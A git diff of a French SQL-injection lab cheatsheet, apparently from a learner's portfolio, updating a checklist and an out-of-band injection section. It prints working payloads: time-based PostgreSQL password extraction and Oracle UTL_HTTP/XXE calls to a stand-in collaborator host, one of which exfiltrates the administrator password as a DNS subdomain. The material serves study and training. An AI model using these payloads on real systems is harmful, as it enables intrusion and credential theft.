@@ -19,7 +19,8 @@ Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les la
 - [x] 🟠 **Praticien** : [Blind SQL injection with conditional errors](./10-blind-sqli-errors.md)
 - [x] 🟠 **Praticien** : [Visible error-based SQL injection](./11-visible-error-sqli.md)
 - [x] 🔴 **Praticien** : [Blind SQL injection with time delays](./12-blind-sqli-time.md)
-- [x] 🔴 **Expert** : [Blind SQL injection with out-of-band interaction](./13-blind-sqli-oast.md)
+- [x] 🔴 **Praticien** : [Blind SQL injection with out-of-band interaction](./13-blind-sqli-oast.md)
+- [x] 🔴 **Praticien** : [Blind SQL injection with out-of-band data exfiltration](./14-blind-sqli-oast-exfiltration.md)
 ---
 
 ## ⚔️ L'Arsenal Tactique (Cheatsheet)
@@ -81,13 +82,13 @@ Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les la
 * **Exfiltration (Ex: PostgreSQL) :** `'||(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users WHERE username='admin')--`
     * *Méthode :* Optimiser l'extraction manuellement avec une recherche dichotomique (utiliser `<` et `>`) pour trouver les caractères plus rapidement que le brute-force automatique.     
 
-**
-```markdown
-### 8. Injections SQL Out-Of-Band (OAST)
-*Forcer la base de données à "téléphoner maison" (requête DNS/HTTP) lorsque les requêtes sont asynchrones (ni erreur, ni délai, ni affichage).*
 
-* **Oracle (via XXE dans EXTRACTVALUE) :** `'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://VOTRE_SERVEUR.com/"> %remote;]>'),'/l') FROM dual)--`
-* **Oracle (via UTL_HTTP) :** `'||(SELECT UTL_HTTP.REQUEST('http://VOTRE_SERVEUR.com') FROM dual)--`
-    * *Méthode :* Injecter le payload ciblant une adresse sous votre contrôle (ex: Burp Collaborator, interactsh, oastify). **Attention :** Ne cibler que la valeur d'injection pour l'encodage URL, jamais le cookie de session entier !         
+### 8. Injections SQL Out-Of-Band (OAST & Exfiltration)
+*Forcer la base de données à "téléphoner maison" (requête DNS/HTTP) lorsque les requêtes sont asynchrones. Permet de confirmer la faille et d'exfiltrer discrètement des données.*
 
+* **Ping OAST simple (Oracle via UTL_HTTP) :** `'||(SELECT UTL_HTTP.REQUEST('http://VOTRE_COLLABORATOR.com') FROM dual)--`
+* **Ping OAST simple (Oracle via XXE) :** `'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://VOTRE_COLLABORATOR.com/"> %remote;]>'),'/l') FROM dual)--`
+* **Exfiltration de données (Oracle via XXE) :** `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.VOTRE_COLLABORATOR.com/"> %remote;]>'),'/l') FROM dual--`
+    * *Méthode :* Injecter le payload ciblant une adresse sous votre contrôle (Burp Collaborator, oastify). Pour l'exfiltration, la technique consiste à concaténer le résultat de la requête SQL ciblée pour qu'il devienne un sous-domaine de l'URL du Collaborator.
+    * *Piège HTTP :* Toujours **URL-encoder** (`Ctrl+U`) le payload s'il contient du XML ou des caractères spéciaux avant l'envoi. Cela évite une erreur `500 Internal Server Error` due à la corruption de l'en-tête HTTP. Ne **jamais** encoder le jeton de session (`session=...`).
 
